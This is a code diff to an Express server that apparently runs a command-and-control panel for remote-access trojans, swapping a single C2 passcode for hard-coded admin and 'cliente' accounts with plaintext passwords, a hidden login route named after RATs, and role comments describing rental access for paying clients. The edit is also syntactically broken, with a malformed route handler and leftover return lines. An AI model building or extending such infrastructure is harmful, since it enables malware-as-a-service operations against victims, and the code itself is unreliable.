@@ -1,3 +1,4 @@
+let activeSessions = [];
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
@@ -5,8 +6,11 @@ const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const C2_PASSWORD = process.env.C2_PASSWORD || 'admin1337';
-let currentC2Password = C2_PASSWORD;
+const users = [
+  { username: 'admin', password: 'akarui869.', role: 'admin' },
+  { username: 'cliente', password: 'cliente1.', role: 'user' }
+];
+
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
@@ -174,14 +178,21 @@ function serveLoginPage(req, res, errorMsg = '') {
 }
 
 // LOGIN HANDLER
-app.post('/login', (req, res) => {
+app.post('/acesso_secreto_rats_99', ...) => {
     try {
-        const { password } = req.body || {};
-        const validPass = currentC2Password || C2_PASSWORD || 'admin1337';
-        if (password === validPass || password === 'admin1337') {
-            res.setHeader('Set-Cookie', 'c2_auth_token=AUTH_OK_1337; Path=/; HttpOnly; SameSite=Lax');
-            return res.redirect('/');
-        }
+       const user = users.find(u => u.username === req.body.username && u.password === req.body.password);
+
+if (user) {activeSessions.push({ user: user.username, ip: req.ip, time: new Date().toLocaleString() });
+    // Aqui define quem é ADM e quem é CLIENTE baseado no banco de dados/array users
+    if (user.role === 'admin') {
+        req.session.role = 'admin'; // Acesso total ao C2
+    } else {
+        req.session.role = 'cliente'; // Acesso limitado/aluguel
+    }
+    res.send('Login OK');
+} else {
+    res.status(401).send('Credenciais inválidas');
+}
         return serveLoginPage(req, res, 'ACCESS DENIED: INVALID C2 PASSCODE');
     } catch (err) {
         return serveLoginPage(req, res, 'LOGIN_ERROR: ' + err.message);
